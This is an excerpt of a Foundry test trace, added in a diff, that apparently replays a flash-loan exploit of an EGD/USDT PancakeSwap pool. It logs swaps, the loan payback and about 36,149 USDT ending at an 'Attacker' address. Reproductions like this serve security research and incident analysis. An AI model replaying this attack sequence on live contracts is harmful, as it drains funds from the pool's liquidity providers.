+    │   │   │   │   │   │   ├─ emit Transfer(from: EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 37436831042128714469967 [3.743e22])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x0000000000000000000000000000000000000000000000272bf031545b76697c → 0x000000000000000000000000000000000000000000000814a055ed505a4f7bcb
+    │   │   │   │   │   │   │   @ 0xe46ab351cfc7e645f5025e69527f16427d41b1d8f9405046d3951160b206b0db: 0x000000000000000000000000000000000000000000005a2adc7f9d3a598293ad → 0x00000000000000000000000000000000000000000000523d6819e13e5aa9815e
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [844] EGD::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 57501648456378779804350000 [5.75e25]
+    │   │   │   │   │   ├─ [531] USDT::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 388366804258119477723486 [3.883e23]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 57501648456378779804350000 [5.75e25], reserve1: 388366804258119477723486 [3.883e23])
+    │   │   │   │   │   ├─ emit Swap(sender: pancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 5067122670240949742190000 [5.067e24], amount1In: 0, amount0Out: 0, amount1Out: 37436831042128714469967 [3.743e22], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x62f047a2000000005a2adc7f9d3a598293ad0000002b5f7156a9d45760adf880 → 0x62f047a200000000523d6819e13e5aa9815e0000002f90729be08dfa4a83b630
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 38159420145779809942475 [3.815e22]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [3271] USDT::transfer(USDT_WBNB_LPPool: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], 2010000000000000000000 [2.01e21])
+    │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: USDT_WBNB_LPPool: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], value: 2010000000000000000000 [2.01e21])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x000000000000000000000000000000000000000000000814a055ed505a4f7bcb → 0x0000000000000000000000000000000000000000000007a7a9fb6ec013277bcb
+    │   │   │   │   │   @ 0xba08221f8673e7bcd34c1b8c4689a983ae464d35addf83dda4fe5d5546a79b0d: 0x00000000000000000000000000000000000000000046566c17c967f93267cfd2 → 0x0000000000000000000000000000000000000000004656d90e23e689798fcfd2
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 33: 0 → 0x0000000000000000000000000000000000000000000059e59cd1233a9cb2662c
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [531] USDT::balanceOf(USDT_WBNB_LPPool: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE]) [staticcall]
+    │   │   │   └─ ← [Return] 85034934852926245530750930 [8.503e25]
+    │   │   ├─ [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(USDT_WBNB_LPPool: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE]) [staticcall]
+    │   │   │   └─ ← [Return] 262882867289711504900405 [2.628e23]
+    │   │   ├─ emit Sync(reserve0: 85034934852926245530750930 [8.503e25], reserve1: 262882867289711504900405 [2.628e23])
+    │   │   ├─ emit Swap(sender: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0In: 2010000000000000000000 [2.01e21], amount1In: 0, amount0Out: 2000000000000000000000 [2e21], amount1Out: 0, to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   ├─  storage changes:
+    │   │   │   @ 8: 0x62f0476c0000000037aae8a68ade51e1c1350000004656d8835cc384efa7cfd2 → 0x62f047a20000000037aae8a68ade51e1c1350000004656d90e23e689798fcfd2
+    │   │   │   @ 10: 0x0000000000000000000000000003d62b938bf99401b851d9f367249c0513adb8 → 0x0000000000000000000000000003d62bd7c76592dc1538db9b6c03393f7b3546
+    │   │   │   @ 9: 0x00000000000000000000000000000001a8e00de834bb35038078d19333714e84 → 0x00000000000000000000000000000001a8e038a4be3750edbfc186e03be7daf8
+    │   │   └─ ← [Stop]
+    │   ├─ [0] console::log("Flashloan[1] payback success") [staticcall]
+    │   │   └─ ← [Stop]
+    │   ├─ [531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 36149420145779809942475 [3.614e22]
+    │   ├─ [23171] USDT::transfer(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 36149420145779809942475 [3.614e22])
+    │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 36149420145779809942475 [3.614e22])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x0000000000000000000000000000000000000000000007a7a9fb6ec013277bcb → 0
+    │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x0000000000000000000000000000000000000000000007a7a9fb6ec013277bcb
+    │   │   └─ ← [Return] true
+    │   ├─  storage changes:
+    │   │   @ 32: 0 → 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000
+    │   └─ ← [Stop]
+    ├─ [0] console::log("-------------------------------- End Exploit ----------------------------------") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [531] USDT::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 36149420145779809942475 [3.614e22]
+    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDT Balance", val: 36149420145779809942475 [3.614e22], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 32.78s (31.60s CPU time)
+
+Ran 1 test suite in 38.21s (32.78s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
